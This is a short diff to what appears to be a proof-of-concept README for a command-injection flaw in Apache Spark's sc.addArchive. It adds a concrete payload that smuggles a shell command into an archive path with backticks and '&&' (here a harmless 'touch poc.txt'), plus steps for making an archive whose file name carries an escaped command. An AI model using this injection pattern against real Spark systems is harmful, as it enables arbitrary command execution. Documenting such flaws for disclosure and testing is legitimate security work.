@@ -22,8 +22,16 @@ docker-compse up
 attach to the shell of container and run `spark-shell`, input
 
 ```bash
-sc.addArchive("/`{command}`&&poc.tar")
+sc.addArchive("/`touch poc.txt`&&poc.tar")
 ```
+
+Or you can create yourself archive file and copy it to container with
+
+```
+touch \`{command(need escapation)}\`\&\&data.tar
+```
+
+A local screenshot of poc.
 
 ![poc](images/poc.jpg)
 
